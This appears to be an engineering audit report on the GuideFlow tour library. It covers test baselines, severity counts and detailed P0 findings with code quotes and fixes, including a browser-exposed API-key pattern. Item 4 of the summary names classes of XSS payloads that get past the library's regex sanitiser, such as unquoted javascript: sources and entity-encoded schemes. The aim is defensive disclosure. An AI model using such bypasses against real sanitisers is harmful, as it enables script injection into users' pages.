# GuideFlow engineering audit

**Date:** 2026-07-30 · **Commit:** `d87bc26` · **Version audited:** 0.1.9

**Method.** Ten parallel dimension audits (core engine, security, build/packaging, framework
adapters, AI, analytics, devtools extension, CLI, docs-vs-reality, a11y/i18n/UX), each followed by an
adversarial verification pass whose job was to *refute* its own dimension's findings, then a
completeness critic over the survivors. 21 agents, ~900 tool calls. 328 findings were raised; **3 were
refuted and dropped**. Every finding below cites `file:line` and quotes verbatim source.

**Machine-readable copy:** [`audit-findings.json`](audit-findings.json) — use it to filter, sort, or
drive automation. Keep it in sync when you resolve a finding (`"status": "resolved"`).

---

## 1. Verified baseline

Everything in this table was measured by running the commands, not inferred:

| Check | Result |
|---|---|
| `turbo run build` (9 packages) | ✅ green |
| `turbo run type-check` (13 tasks) | ✅ green |
| `turbo run lint` (8 packages, `--max-warnings 0`) | ✅ green |
| `turbo run test` | ✅ **197 passing** — core 114, ai 37, analytics 32, react 14 |
| `size-limit` gate on `@guideflow/core` | ✅ **11.09 kB / 12 kB** |
| Actual shipped `packages/core/dist/index.js` | ⚠️ **14.95 kB gzip** |

Those last two rows are both true and measure different things: `size-limit` builds a fresh esbuild
project against the entry and tree-shakes, while a consumer who imports the package barrel downloads
14.95 kB. The README's "~12 kB gzip" describes the gate, not the artifact.

**Read the green column carefully.** The pipeline is green *and* the library's own README quick-start
is broken. That gap is the single most important fact in this document, and it is a direct consequence
of the coverage holes in §5: `vue` reports green with zero tests behind `--passWithNoTests`; `svelte`,
`cli` and `devtools` have no `test` script at all so Turbo silently skips them; and the Playwright
suite has never executed once.

---

## 2. Summary

| Severity | Count | Meaning |
|---|---|---|
| **P0** | **22** | Shipped broken or exploitable. A user following the docs hits this. |
| **P1** | **119** | Serious defect, or a headline feature that does not work. |
| **P2** | **142** | Notable gap or correctness issue with a workaround. |
| **P3** | **42** | Minor. |
| **Total** | **325** | |

By area:

| Area | P0 | P1 | P2 | P3 | Total |
|---|---:|---:|---:|---:|---:|
| Core engine | 4 | 15 | 14 | 1 | 34 |
| Build & packaging | 0 | 4 | 21 | 9 | 34 |
| Framework adapters | 4 | 10 | 16 | 4 | 34 |
| DevTools extension | 1 | 9 | 23 | 9 | 42 |
| Docs & tests | 4 | 25 | 9 | 0 | 38 |
| Accessibility / i18n / UX | 3 | 13 | 10 | 2 | 28 |
| Analytics | 0 | 10 | 15 | 2 | 27 |
| Product gaps | 1 | 12 | 7 | 4 | 24 |
| AI package | 1 | 8 | 11 | 3 | 23 |
| CLI & studio | 2 | 10 | 5 | 4 | 21 |
| Security | 2 | 3 | 11 | 4 | 20 |

### The five things that matter most

1. **`final-state-steps-never-rendered` (P0).** `TourEngine.next()` checks `isFinal` *after*
   transitioning, so the moment the machine enters a state marked `final: true` the tour ends without
   rendering that state's steps. **The README's own quick-start silently shows 1 of its 2 steps** —
   reproduced by running the README flow verbatim through the engine. Most documented examples are
   affected. Nothing else on this list matters until this is fixed.

2. **The renderer's positioning is broken on any scrolled page (`popover-viewport-coordinate-mismatch`,
   P0).** `getViewportRect()` returns page coordinates (`window.scrollX/scrollY`) while the target rect
   comes from `getBoundingClientRect()` in client coordinates. Every fit test fails once the page is
   scrolled, so the popover falls through to a clamped centre. A tour on a long page detaches from its
   target.

3. **Documentation describes a different library.** 52 documentation findings, including P0s where the
   Quick Start teaches a flow shape that throws, all six theme pages import CSS files that do not
   exist, and the React API reference documents components and props that were never written.
   Empirically, following the docs is more likely to fail than to work.

4. **`content.html` is not sanitised (`sanitize-html-regex-denylist-bypass`, P0).** The regex denylist
   was defeated by **6 of 8** trivial payloads in a direct test — unquoted `src=javascript:`, unclosed
   `<script>`, entity-encoded schemes, `xlink:href`, and `style` URLs all pass through untouched.
   `step.actions[].action` is interpolated into an attribute with no escaping at all.

5. **Two headline features are vaporware.** `guideflow studio` is documented as "the visual tour
   editor"; it starts a bare Vite server on the user's project and injects one unused boolean.
   `guideflow export` on a `.ts`/`.js` file writes a truncated raw-string stub, not a flow. `guideflow
   push` defaults to `https://api.guideflow.dev`, a service that does not exist.

### Cross-cutting themes

- **Silent failure is the house style.** Transports no-op when their global is missing; `goTo()` across
  states does nothing and reports nothing; `prevStep()` returns `false` and the engine re-renders
  anyway; provider JSON parse failures return `[]`; `init --framework vue` scaffolds nothing and prints
  success. Almost every defect in this document is invisible at runtime.
- **The type system is doing less work than it appears to.** `tsconfig.base.json` is unusually strict,
  yet `createGuideFlow` is assembled through `Object.assign(engine as any, …)` so the entire public
  interface is unverified, and `packages/core/src/index.ts` has no test file at all.
- **Docs and code were written in parallel, not from each other.** The volume of fabricated APIs
  (`setLocale`, `stopWatch`, per-theme CSS files, CLI flags, React props) suggests documentation was
  authored from intent rather than from the source.
- **Nothing has ever run in a real browser.** happy-dom has no layout engine, so every geometry bug —
  positioning, spotlight tracking, focus, click-through — was structurally invisible to the test suite.
  Two of the P0s are geometry bugs.

---

## 3. What GuideFlow actually is today

An honest inventory, separating what works from what is claimed. Written from the source, not the
README.

### Works, and works well

- **A hand-rolled FSM tour engine.** `FlowMachine` tracks `(state, stepIndex)`; states carry `steps`,
  an `on` transition table with guards, `onEntry`/`onExit`, and a `final` flag. Nothing else in the
  open-source tier models tours this way, and it is the project's real differentiator.
- **Zero runtime dependencies in `core`**, strict TypeScript throughout (`exactOptionalPropertyTypes`,
  `noUncheckedIndexedAccess`, `verbatimModuleSyntax`), clean SSR safety — no module-scope DOM access
  anywhere.
- **A pure, well-tested positioning solver.** `computePosition` handles 13 placements with fallback
  sequences and clamping. The maths is correct; the *caller* passes it mismatched coordinate spaces.
- **Spotlight overlay** that tracks a target through scroll and resize via `ResizeObserver` plus
  capture-phase listeners.
- **Hotspots and hints** as standalone UI, independent of any active tour.
- **Persistence layer** — `ProgressStore` over localStorage / IndexedDB / custom drivers, with TTL
  wrapping and a `BroadcastChannel` cross-tab sync class.
- **A pluggable renderer contract**, so the default UI is genuinely replaceable.
- **Design-token importers** (`fromTailwind`, `fromRadix`, `fromShadcn`) mapping external tokens to CSS
  variables.
- **Analytics collector + `ExperimentEngine`** with deterministic djb2 bucketing.
- **A real MV3 DevTools extension** that builds, loads, detects a page, and streams tour events —
  unique in this category.
- **Build and release infrastructure**: pnpm workspaces, Turbo, tsup dual ESM/CJS + IIFE, Changesets,
  three GitHub Actions workflows, `size-limit`, Storybook, VitePress.

### Exists but is broken or unwired

| Feature | Reality |
|---|---|
| Multi-step tours ending in a `final` state | last state's steps never render (`final-state-steps-never-rendered`) |
| Resume from saved progress | FSM restores, UI stays on step 0 (`resume-renders-step-zero`) |
| "Don't show again" | `markDismissed` exists; nothing ever calls it |
| Completed-tour suppression | `isCompleted` is never checked in `start()` — tours replay forever |
| Cross-tab sync | `BroadcastSync` only constructed on the resume path |
| Per-instance i18n | renderer reads a module singleton; `gf.i18n.use()` does nothing (**reproduced**) |
| `clickThrough` | inline `pointer-events` from `show()` always beats the class |
| Intro.js/driver.js compat | only `data-gf-*` attributes; each step becomes its own 1-step tour |
| `configure()` | only `nonce` takes effect |
| Custom renderer `onInit` | only ever called for `DefaultRenderer` |
| `goTo()` / `prev()` across states | silently do nothing (**reproduced**) |
| A/B testing | assigns a variant that no GuideFlow API can apply |
| Intent detection | `intent:detected` fires and is connected to nothing |
| Analytics funnels | every step event ships `flow_id: undefined` |
| `guideflow studio` | a bare Vite server plus one unused boolean |
| `guideflow export` (.ts/.js) | writes a truncated string stub |
| `guideflow push` | points at a non-existent SaaS |
| DevTools "Load saved tour" | a no-op stub |
| Playwright e2e suite | has never executed |

### Absent entirely

**SPA route changes** — no `popstate`, `pushState`, or `hashchange` handling anywhere in the
monorepo, so a tour cannot span two routes. **Focus trap and focus restore.** **`prefers-reduced-motion`.**
**Live-region announcements.** **Vue and Svelte components** (both packages advertise them).
**Targeting / audience rules, scheduling, frequency capping.** **Checklists, surveys, banners,
resource centre.** **A backend or flow CMS.** **Any authoring path for non-engineers.**
**Flow versioning** (a stale snapshot restores into a changed graph). **Touch/mobile support.**
**Shadow-DOM and iframe target resolution.** **A maintained CHANGELOG.**

### Who it is for

Today, honestly: **a TypeScript developer who wants a small, strict, state-machine-based tour engine
and is willing to work around the defects in this document.** The FSM model, the zero-dependency
budget and the devtools extension are genuinely differentiated. The AI, cloud, studio and no-code
stories are not yet real.

---

## 4. P0 — shipped broken or exploitable

22 findings. A user following the documentation hits these.

### `clickthrough-overlay-still-blocks` — clickThrough is broken — an inline pointer-events style set by show() always beats the .gf-clickthrough class

**Accessibility / i18n / UX · bug · CONFIRMED** · [`packages/core/src/engine/spotlight.ts:165`](../../packages/core/src/engine/spotlight.ts#L165) · effort S

> ```
>     this._overlayEl.style.opacity = '1'
>     this._overlayEl.style.pointerEvents = 'all'
> ```

**Impact.** `setClickThrough(true)` (line 113-120) only adds a class whose rule is `[data-gf-overlay].gf-clickthrough { pointer-events: none; }` (lines 20-22). Inline styles beat any non-`!important` stylesheet rule, and `_ensureElements()` re-applies `pointerEvents = 'all'` on every `show()`. `TourEngine._renderCurrentStep` calls them in exactly that order — `packages/core/src/engine/tour.ts:245` `this._spotlight.show(target, …)` then line 249 `this._spotlight.setClickThrough(step.clickThrough ?? false)` — so the inline `all` is written first and never cleared. A step declared with `clickThrough: true` still has a full-viewport transparent div intercepting every pointer event; the user cannot click the very element the step is telling them to click, and because `dismissOnBackdropClick` defaults to true (line 61) their click instead skips the tour. The documented interactive-step feature in apps/docs/guide/spotlight-popover.md has never worked.

**Fix.** In `setClickThrough`, set `this._overlayEl.style.pointerEvents = enabled ? 'none' : 'all'` directly rather than relying on the class, or stop writing the inline value in `_ensureElements()` and let the stylesheet own it. Add a unit test asserting `getComputedStyle(overlay).pointerEvents === 'none'` after a `clickThrough: true` step renders.

### `per-instance-i18n-dead` — Per-instance i18n is entirely non-functional — both renderers read the module-level defaultI18n singleton

**Accessibility / i18n / UX · bug · CONFIRMED** · [`packages/core/src/renderer/default-renderer.ts:157`](../../packages/core/src/renderer/default-renderer.ts#L157) · effort M

> ```
>   private _buildHTML(step: Step, content: StepContent, index: number, total: number): string {
>     const i18n = defaultI18n
> ```

**Impact.** `createGuideFlow()` builds a fresh registry per instance — `packages/core/src/index.ts:162: const i18n = new I18nRegistry()` — and exposes it as `instance.i18n`. But every rendered string (`i18n.t('prev')`, `i18n.t('next')`, `i18n.t('done')`, `i18n.t('close')`, `i18n.t('skip')`, `i18n.t('stepOf', …)` at lines 163-185) resolves against the imported `defaultI18n` singleton from line 8, which nothing ever writes to. `packages/react/src/components/GuidePopover.tsx:49` does the same: `const i18n = defaultI18n`. Consequently `gf.i18n.register('fr', …); gf.i18n.use('fr')` has zero effect on the UI — the popover renders "Next"/"Back"/"Skip tour"/"Step 2 of 5" in English forever. The project's own demo relies on this: `apps/demo/src/main.tsx:29-46` registers fr/es/zh and `apps/demo/src/App.tsx:214` runs `gf.i18n.use(locale)`, so the demo's language switcher only updates the string table it prints on screen while the actual tour stays English. Every non-English deployment of this library is broken. `packages/core/src/__tests__/i18n.test.ts` tests the registry in isolation and never wires one to a renderer, which is why nothing caught it.

**Fix.** Pass the instance registry into the renderer: add an `i18n` field to `GuideFlowConfig`/`RendererContract.onInit`, store it in `DefaultRenderer._config`, and use `this._config?.i18n ?? defaultI18n` in `_buildHTML`. For React, read the registry off the instance from `useGuideFlow()` (`gf.i18n`) instead of importing `defaultI18n`, and re-render the popover when `use()` is called (add a change listener to `I18nRegistry`).

### `popover-position-coordinate-mismatch` — Popover positioning mixes viewport-relative and page-relative coordinates, throwing the popover off-screen on any scrolled page

**Accessibility / i18n / UX · bug · CONFIRMED** · [`packages/core/src/renderer/default-renderer.ts:212`](../../packages/core/src/renderer/default-renderer.ts#L212) · effort S

> ```
>     const targetRect = target.getBoundingClientRect()
>     const viewport = getViewportRect()
> ```

**Impact.** `getBoundingClientRect()` is viewport-relative (origin = top-left of the visible area) but `getViewportRect()` returns page coordinates — `packages/core/src/engine/popover.ts:155-158: x: window.scrollX, y: window.scrollY`. `computePosition` then runs `fitsInViewport` (popover.ts:75-82), which requires `pos.y >= viewport.y`, i.e. `pos.y >= window.scrollY`. Once the page is scrolled — which `TourEngine` guarantees, since it calls `scrollTargetIntoView(target)` at tour.ts:236 before positioning — every candidate placement fails the fit test, the loop exhausts, and control falls to `clampToViewport` (popover.ts:118-121), which returns `y = max(scrollY + 8, …)`. That value is written to `el.style.top` on an element whose CSS is `position: fixed` (line 26). On a page scrolled 2000px, the popover is placed at `top: 2008px` in fixed coordinates — completely off-screen. The user sees a spotlight cutout with no popover and no way to advance except arrow keys. `packages/react/src/components/GuidePopover.tsx:84-96` has the identical defect. The unit tests in `packages/core/src/__tests__/popover.test.ts` pass an explicit `{x:0,y:0}` viewport, so they never exercise the scrolled case.

**Fix.** Make the coordinate systems agree: since both popovers are `position: fixed`, `computePosition` should be given a viewport of `{ x: 0, y: 0, width: innerWidth, height: innerHeight }`. Either change `getViewportRect()` to return zeros for x/y (and rename `getAbsoluteRect` users accordingly) or subtract the scroll offset before calling. Add a test that scrolls the document and asserts the resulting top/left fall inside `[0, innerHeight]`.

### `docs-react-guidepopover-fabricated-props` — apps/docs/api/react/guide-popover.md documents three props that do not exist and claims the component works without TourProvider, which throws

**Framework adapters · docs · CONFIRMED** · [`apps/docs/api/react/guide-popover.md:18`](../../apps/docs/api/react/guide-popover.md#L18) · effort M

> ```
>       target="#new-feature"
>       placement="bottom"
>       content={{
>         title: 'New Feature!',
>         body: 'Check out this new capability.',
>       }}
> ```

**Impact.** `GuidePopoverProps` (GuidePopover.tsx:13-22) accepts exactly `width?: number`, `children?`, and `className?: string`. `target`, `placement` and `content` are all rejected by TypeScript and ignored at runtime. Worse, line 41 of this page asserts "Can be used without `TourProvider`", but GuidePopover.tsx:45 calls `const gf = useGuideFlow()` which throws `'[GuideFlow] useGuideFlow must be used inside a <TourProvider>'` (context.tsx:48). Every consumer following the documented "standalone popover / one-off tooltip outside of a tour context" use case gets an unrecoverable render-time exception.

**Fix.** Either implement the documented standalone mode (accept `target`/`placement`/`content` props, use `useContext(GuideFlowContext)` instead of the throwing `useGuideFlow()`, and fall back to prop-driven rendering when there is no provider), or rewrite the page to document the real tour-bound `{ width, className, children }` API and delete the "Can be used without TourProvider" and "scroll tracking" claims.

### `docs-react-tour-step-wrong-component` — apps/docs/api/react/tour-step.md documents a component that does not exist — <TourStep /> with no props, described as the popover renderer

**Framework adapters · docs · CONFIRMED** · [`apps/docs/api/react/tour-step.md:19`](../../apps/docs/api/react/tour-step.md#L19) · effort S

> ```
>     <TourProvider instance={gf}>
>       <TourStep />
>       <YourApp />
>     </TourProvider>
> ```

**Impact.** The shipped component is `export function TourStep({ id, children }: TourStepProps)` where `id: string` is required and the body is `if (!isActive || !children) return null` — it renders nothing but its own children when the matching step is active. It never renders a popover, never touches the spotlight, and never wires next/prev/skip buttons, all of which this page claims under "## Behavior" ("Positions the popover relative to the current step's target element", "Manages the spotlight overlay", "Handles next/prev/skip button actions"). A user copying this page gets a TypeScript error (`Property 'id' is missing`) and, if they cast past it, a component that renders `null` forever — so they conclude GuideFlow's React support is broken.

**Fix.** Rewrite apps/docs/api/react/tour-step.md to document the real `{ id, children }` render-prop gate, and move the "renders the popover / manages the spotlight" description to the DefaultRenderer / GuidePopover pages. Also fix the same wrong one-liner in packages/react/README.md ("`TourStep` | Renders the current tour step popover") and apps/docs/packages/react.md ("`TourStep` | Component | Step renderer").

### `docs-svelte-store-example-compile-error` — The Svelte API doc's headline example uses $tour on a plain object — a Svelte compile error, duplicated in the source JSDoc

**Framework adapters · docs · CONFIRMED** · [`apps/docs/api/svelte/create-tour-store.md:67`](../../apps/docs/api/svelte/create-tour-store.md#L67) · effort S

> ```
> {#if $tour.isActive}
>   <p>Step {$tour.currentStepIndex + 1} of {$tour.totalSteps}</p>
> ```

**Impact.** `createTourStore()` returns a `TourStore` — a plain object whose *fields* are stores (`isActive: { subscribe: _isActive.subscribe }`, index.ts:88-91). The object itself has no `subscribe` method, so the Svelte compiler rejects `$tour` with "'tour' is not a store with a 'subscribe' method". The only correct form is destructuring first (`const { isActive } = tour` then `$isActive`), which is what README.md:222 and apps/docs/guide/svelte.md:47 do — so the two doc sets contradict each other and the canonical API reference is the broken one. The same broken pattern is baked into the exported JSDoc at packages/svelte/src/index.ts:59, which additionally has a malformed closing tag: `{#if $tour.isActive}Step {$tour.currentStepIndex + 1}</>`.

**Fix.** Rewrite the example in apps/docs/api/svelte/create-tour-store.md (lines 60-73) and the JSDoc in packages/svelte/src/index.ts (lines 52-60) to destructure the readables before `$`-subscribing, and fix the stray `</>`. Optionally add a top-level `subscribe` to `TourStore` (a derived store of all four scalars) so `$tour.isActive` actually becomes legal.

### `react-guidepopover-duplicates-core-renderer` — <GuidePopover> renders a second popover on top of core's DefaultRenderer — two stacked aria-modal dialogs

**Framework adapters · bug · CONFIRMED** · [`packages/react/src/components/GuidePopover.tsx:37`](../../packages/react/src/components/GuidePopover.tsx#L37) · effort M

> ```
>  * @example
>  * ```tsx
>  * <TourProvider config={...}>
>  *   <App />
>  *   <GuidePopover />
>  * </TourProvider>
>  * ```
> ```

**Impact.** core/src/index.ts:161 installs the themed DOM renderer unconditionally: `const renderer = (config.renderer ?? new DefaultRenderer()) as DefaultRenderer`. DefaultRenderer.renderStep() creates its own `div.gf-popover` with `role="dialog" aria-modal="true"`, appends it to document.body and steals focus (`firstFocusable?.focus()`, default-renderer.ts:125). Following GuidePopover's own JSDoc therefore paints TWO visually identical popovers at the same computed position for every step, with two `aria-modal="true"` dialogs in the a11y tree, and focus jumping into the core one while the React one holds the click handlers the user thinks they configured. Nothing in the React package, its README, or apps/docs tells the user to suppress the default renderer, and there is no documented no-op renderer to pass.

**Fix.** Export a `NullRenderer` (or a `headless: true` config flag) from @guideflow/core and have `<GuidePopover>` assert on mount that `gf` was constructed with it — warn loudly otherwise. Update the JSDoc example and apps/docs/api/react/guide-popover.md to show `createGuideFlow({ renderer: new NullRenderer() })`. Simplest alternative: make `<GuidePopover>` call `gf.configure({ renderer: nullRenderer })` in a layout effect on mount and restore on unmount.

### `api-keys-shipped-to-browser` — Every documented example instructs users to embed their OpenAI/Anthropic API key in client-side code

**AI package · security · CONFIRMED** · [`apps/docs/guide/ai.md:29`](../../apps/docs/guide/ai.md#L29) · effort M

> ```
>   new OpenAIProvider({ apiKey: import.meta.env.VITE_OPENAI_KEY }),
> ```

**Impact.** `VITE_`-prefixed env vars are inlined into the client bundle by Vite by design, so this pattern publishes a live provider secret to every visitor. The same pattern appears in README.md:248, apps/docs/guide/ai-generate.md:17, apps/docs/guide/ai-intent.md:17, apps/docs/guide/ai-chat.md:37, and apps/docs/api/ai/create-ai.md:43 — there is no server-proxy example anywhere and no warning. The provider code reinforces it: `apiKey: opts.apiKey ?? (typeof process !== 'undefined' ? process.env['OPENAI_API_KEY'] ?? '' : '')` (openai.ts:36) is bundler-inlined in webpack/Vite builds too, so even the env-var path leaks. Anyone shipping the documented snippet has their key scraped and billed against.

**Fix.** Delete the `import.meta.env.VITE_*` pattern from all six docs locations. Document a server-side proxy as the only supported browser deployment: expose `OllamaProviderOptions`-style `baseUrl` on the OpenAI/Anthropic providers so callers can point at their own authenticated endpoint, and add a prominent warning block to apps/docs/guide/ai.md stating that provider keys must never reach the browser. Consider throwing from the constructors when a key is supplied in a browser context without an explicit `dangerouslyAllowBrowser`-style opt-in.

### `export-ts-js-emits-stub-not-flow` — `guideflow export` on a .ts/.js file never emits a FlowDefinition — it writes a truncated raw string snippet

**CLI & studio · bug · CONFIRMED** · [`packages/cli/src/commands/export.ts:47`](../../packages/cli/src/commands/export.ts#L47) · effort L

> ```
>       flowJson = {
>         _note: 'Static extraction was used. Review and complete this file.',
>         rawSnippet: match[0].slice(0, 500),
>       };
> ```

**Impact.** The `.ts`/`.js` branch — the primary documented path (apps/docs/guide/quick-start.md:84 `npx @guideflow/cli export my-tour.ts`, and export.ts:19 defaults the argument to `'my-tour.ts'`, which is exactly the file `init` scaffolds) — never parses anything. `match` comes from a single non-greedy regex at line 39 and `match[0]` is sliced to 500 characters, so the output for the scaffolded `my-tour.ts` is `{"_note":"...","rawSnippet":"const welcomeTour: FlowDefinition = {\n  id: 'welcome-tour',\n  initial: 'step-1',\n  states: {"}` — a truncated string, not a flow. It is not round-trippable into a `FlowDefinition` by any consumer: it has no `id`, no `initial`, no `states`. It is then written to `my-tour.flow.json`, which is precisely `push`'s default argument (push.ts:23), so the documented `init -> export -> push` pipeline publishes this stub to the cloud. The stated problem of non-serialisable values (`Step.showIf?: (context: TContext) => boolean` at packages/core/src/types/index.ts:60 and `content: StepContent | (() => MaybePromise<StepContent>)` at line 57) is not "silently lossy" — it is never reached, because nothing is ever serialised. Notably apps/demo/src/App.tsx:796 claims its in-browser exporter "reproduces `guideflow export`" by "replacing function values with `\"[Function]\"` annotations"; the CLI does no such thing.

**Fix.** Replace the regex with real evaluation: import the module (jiti/tsx/esbuild-register), take the exported `FlowDefinition`, and serialise with a replacer that (a) emits `{"$fn": "showIf", "source": "..."}` markers or drops functions with a named warning listing each lossy field path, and (b) fails loudly if `content` is a function. Validate the result has `id`/`initial`/`states` before writing. Until that exists, make the `.ts`/`.js` branch exit non-zero with "not implemented — write your flow to JSON" rather than writing a file that looks like a successful export (line 63 currently prints a green `✓ Exported flow`).

### `studio-is-not-a-visual-editor` — `guideflow studio` is vaporware: it serves the user's own project with bare Vite and injects a boolean flag nobody reads

**CLI & studio · missing-implementation · CONFIRMED** · [`packages/cli/src/commands/studio.ts:24`](../../packages/cli/src/commands/studio.ts#L24) · effort L

> ```
>       const server = await createServer({
>         root,
>         server: { port, open: false },
>         plugins: [
>           // Inject the GuideFlow DevTools script into every HTML response
>           {
>             name: 'guideflow-studio',
>             transformIndexHtml(html: string) {
>               return html.replace(
>                 '</body>',
> ```

**Impact.** The entire command body is a Vite dev server pointed at `resolve(opts.root)` (default `.`) plus a one-line HTML injection. There is no editor bundle, no served asset directory, no HTML/JS for a builder anywhere in the repo. A repo-wide grep for `__GUIDEFLOW_DEVTOOLS__` returns exactly three producers/consumers: this line, and `apps/demo/src/App.tsx:207` (`setStudioActive(w.__GUIDEFLOW_DEVTOOLS__ === true)`) which only flips a status badge. Nothing in `packages/devtools/src/**` reads the flag — the DevTools panel is a Chrome extension loaded via `chrome://extensions`, entirely unrelated to this server. Concretely: a user installs the CLI, runs `guideflow studio` in a project with no `index.html` at root (e.g. the repo's own root script `package.json:23` -> `"studio": "pnpm --filter @guideflow/cli exec guideflow studio"`, which runs it in `packages/cli/`), gets `Studio running at http://localhost:4747`, opens it, and receives a Vite 404 — there is nothing to edit. In a Vite project they get their own app back, unchanged, with one extra global. README.md:534 sells this as "Launch the visual tour editor (opens browser)" and packages/cli/README.md:45 as "the visual tour builder where you can create and edit tours interactively". Neither is true; `open: false` means it does not even open a browser.

**Fix.** Either build the editor or stop claiming it exists. Short term: rename to `guideflow dev`, change its description to "serve your project with the GuideFlow DevTools hook injected", drop "visual tour editor/builder" from README.md:534, packages/cli/README.md:24+45, apps/docs/api/cli.md:46-67, apps/docs/packages/cli.md:23 and apps/docs/guide/index.md:30, and make the command print a warning + exit non-zero when `root` contains no `index.html`. Long term: ship a real editor bundle inside the package (e.g. `packages/cli/studio/` built by tsup/vite) and serve it via a middleware mode server that proxies the user app in an iframe, then wire `packages/devtools/src/panel/app.tsx` (which already has a Builder tab) as the editor host.

### `completed-tours-replay-forever` — Completed tours restart (and resume mid-flow) on every page load — start() never checks isCompleted and the snapshot is never marked completed or cleared

**Core engine · bug · CONFIRMED** · [`packages/core/src/index.ts:249`](../../packages/core/src/index.ts#L249) · effort M

> ```
>         const snapshot = await progress.loadSnapshot(userId, flow.id)
>         if (snapshot && !snapshot.completed) {
> ```

**Impact.** Two co-operating defects. (1) `start()` gates on `isDismissed` and on `snapshot.completed` but never calls `progress.isCompleted(userId, flow.id)`, even though `markCompleted` is written on `tour:complete` (index.ts:195-199) — the completed list is write-only inside core. (2) A snapshot with `completed: true` is never written: on the last step `_engineNext()` → `TourEngine._doEnd()` sets `this._machine = null` and `this._flow = null` *before* the wrapper's `_saveProgress()` runs, so `_saveProgress` hits `if (!userId || !flowId) return` (index.ts:325) and returns. `clearSnapshot` is never called by core either (only apps/demo calls it indirectly via `resetUser`). Net effect for every app that sets `context.userId`: a finished tour re-opens on the next page load, resumed at the second-to-last step, forever.

**Fix.** In `start()`, check `await progress.isCompleted(userId, flow.id)` alongside `isDismissed`. On `tour:complete`, `await progress.clearSnapshot(userId, flowId)` (or save a `completed: true` snapshot) — capture `flowId`/`machine.state` before `_doEnd()` nulls them, e.g. by saving progress inside `_doEnd` before the fields are cleared.

### `final-state-steps-never-rendered` — Steps of any state marked `final: true` are never displayed — tour ends on entry

**Core engine · bug · CONFIRMED** · [`packages/core/src/engine/tour.ts:118`](../../packages/core/src/engine/tour.ts#L118) · effort M

> ```
>     const advanced = this._machine.nextStep()
> 
>     if (!advanced || this._machine.isFinal) {
>       this._doEnd(true)
>       return
>     }
> ```

**Impact.** `isFinal` is checked AFTER the transition, so the moment the FSM enters a state with `final: true` the tour is ended without rendering that state's steps. Two concrete cases: (a) README.md quick start (`states.intro` has 2 steps and `final: true`) shows step-1 then ends on the first Next — step-2 is never shown; (b) apps/docs/guide/flows-and-steps.md's `features` state (`final: true`, 1 step) never displays its step. The same premature end exists in `send()` (tour.ts:143-147). packages/core/src/__tests__/tour-engine.test.ts:95-106 encodes the bug as expected behaviour (3 nexts for a 3-step flow, never asserting step-3 rendered). apps/docs/api/flow-definition.md:59 documents the opposite: "If `true`, the tour ends after this state's steps".

**Fix.** Only end when the machine is final AND there is no renderable step left in that state: in `next()` replace the check with `if (!advanced) { this._doEnd(true); return }` and, after `_renderCurrentStep()`, treat "final state + last stepIndex" as the terminal condition (i.e. end on the *next* `next()` call). Mirror the change in `send()` (tour.ts:143). Add a regression test asserting `renderStep` is called with the final state's step.

### `popover-viewport-coordinate-mismatch` — DefaultRenderer mixes page coordinates with client coordinates — every popover collapses to a clamped centre once the page is scrolled

**Core engine · bug · CONFIRMED** · [`packages/core/src/renderer/default-renderer.ts:213`](../../packages/core/src/renderer/default-renderer.ts#L213) · effort S

> ```
>     const targetRect = target.getBoundingClientRect()
>     const viewport = getViewportRect()
> 
>     const pos = computePosition(
>       { x: targetRect.left, y: targetRect.top, width: targetRect.width, height: targetRect.height },
> ```

**Impact.** `getViewportRect()` returns PAGE coordinates (`x: window.scrollX, y: window.scrollY` — popover.ts:154-158) while `targetRect.left/top` are CLIENT coordinates. `fitsInViewport` then demands `pos.y >= viewport.y`, i.e. `clientY >= scrollY`. With the page scrolled 600px down, a target at client y=100 yields candidate positions around y≈-112..160, all failing `>= 600`, so every placement in the fallback sequence is rejected and the function returns the clamped-centre branch (popover.ts:119-121) with `y = Math.max(scrollY + 8, ...) = 608`. The popover element is `position: fixed`, so `top: 608px` renders it 608px down the *viewport* — off-screen or wildly misplaced, with `data-placement="center"` and no arrow, on every step of every scrolled page. packages/core/src/__tests__/popover.test.ts only ever passes `{x:0,y:0,...}` viewports, so the mismatch is invisible to the suite.

**Fix.** Pass a client-space viewport to `computePosition` from the renderer: `{ x: 0, y: 0, width: window.innerWidth, height: window.innerHeight }` (or add `getClientViewportRect()`). Keep `getViewportRect()` for consumers doing absolute-page math, and document which space each helper returns. Add a test with a non-zero `viewport.y`.

### `resume-renders-step-zero` — Resume path restores FSM state but leaves the rendered UI on step 0

**Core engine · bug · CONFIRMED** · [`packages/core/src/index.ts:252`](../../packages/core/src/index.ts#L252) · effort M

> ```
>           await _engineStart(flow, ctx)
>           // Restore exact position
>           engine.machine?.restore({ state: snapshot.currentState, stepIndex: snapshot.stepIndex })
> ```

**Impact.** `_engineStart` already awaited `_renderCurrentStep()`, which rendered index 0 of the initial state and set `_currentStep`/`_currentContent`/spotlight target to step 0. `FlowMachine.restore()` only mutates `_ctx` and notifies FSM subscribers — nothing re-renders. A user who left on step 5 of state `billing` sees step 1 of state `welcome` in the popover and the spotlight over the wrong element, while `currentStepId`, `next()` and `totalSteps` all report the restored position. `machine.restore` also skips `onEntry`/`onExit`, and `new FlowMachine` has already fired `onEntry` for the *initial* state, so state lifecycle hooks run for a state the user is not in. The identical defect applies to the BroadcastSync handler at index.ts:255-257.

**Fix.** Add a public re-render entry point on TourEngine (e.g. `async rerender(): Promise<void> { this._renderGeneration++; await this._renderCurrentStep() }`) and call it after `restore(...)` in both the resume path and the `progress:sync` handler. Better: give `TourEngine.start()` an optional `{ restore: {state, stepIndex} }` option so the machine is positioned before the first render.

### `bridge-dataclone-aborts-every-tour` — Bridge postMessage of the step:enter payload throws DataCloneError and aborts every targeted tour on the page

**DevTools extension · bug · CONFIRMED** · [`packages/devtools/src/bridge.ts:111`](../../packages/devtools/src/bridge.ts#L111)

> ```
>       gf.on(evt, (...args: unknown[]) => {
>         window.postMessage(
>           { source: BRIDGE_SOURCE, type: 'GF_TOUR_EVENT', payload: { event: evt, args } },
>           '*',
>         );
>       });
> ```

